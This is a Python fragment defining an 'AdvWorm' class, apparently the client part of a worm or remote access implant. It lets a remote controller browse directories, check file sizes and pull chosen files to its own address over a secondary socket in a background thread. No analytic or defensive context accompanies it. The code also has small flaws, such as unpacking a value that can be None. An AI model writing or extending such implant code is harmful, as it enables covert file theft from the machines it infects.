

class AdvWorm(BasicWorm):
    def __init__(self):
        super().__init__()
        self.name = "Advanced Worm"
        self._wait4coor = 4
    
    def getPwd(self) -> str:
        return str(os.getcwd())
    
    def changeDir(self, target_dir: str) -> bool:
        try:
            os.chdir(target_dir)
            return True
        except FileNotFoundError:
            return False
        except OSError:
            return False

    def fileTracking(self, target: str) -> Union[bool, str]:
        if not os.path.exists(target):
            return None
        flen = os.stat(target).st_size
        return str(flen)
    
    def makeXtraSock(self, port: str) -> Union[tuple, bool]:
        try:
            port = int(port)
        except (ValueError, TypeError):
            return None
        try:
            xtra = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            xtra.settimeout(self._wait4coor)
            return (port, xtra)
        except:
            return None
    
    def _sendFile(self, fpath: str, xtra: object) -> None:
        with open(fpath, "rb") as f:
            xtra.sendfile(f, 0)
        


    def sendFile(self, name: str, target: str = None) -> None:
        if not target:
            target = os.path.join(self.getPwd(), name)
        flen = self.fileTracking(target)
        if not flen:
            return None
        msg = self.makeSysMsg(["d", name, flen])
        self.sendMsg(msg)
        
        try:
            resp = self.reciveMsg()
        except socket.timeout:
            return None
        resp = resp.split(" ")
        if len(resp) < 2:
            return None
        port, xtra = self.makeXtraSock(resp[1])
        if not xtra:
            return None
        try:
            xtra.connect((self.ip, port))
        except OSError:
            return None
        send = Thread(target=self._sendFile, args=(target, xtra), daemon=True)
        send.start()
        return True


